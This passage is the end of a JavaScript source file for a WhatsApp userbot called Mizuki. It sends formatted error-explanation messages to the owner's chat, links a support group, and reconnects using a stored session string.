                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [MIZUKI] ⚕️*' +
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await conn.sendMessage(conn.user.jid, '*🙇🏻 Sorry, I Couldnt Read This Error! 🙇🏻*' +
                                        '\n_You can write to our Support group :- https://chat.whatsapp.com/HbURDOKU6Up29kmFXZUMEo for more help._'
                                        , MessageType.text
                                    );
                                }    
                            }                      
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Refreshing your old version string...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}

mizuki();
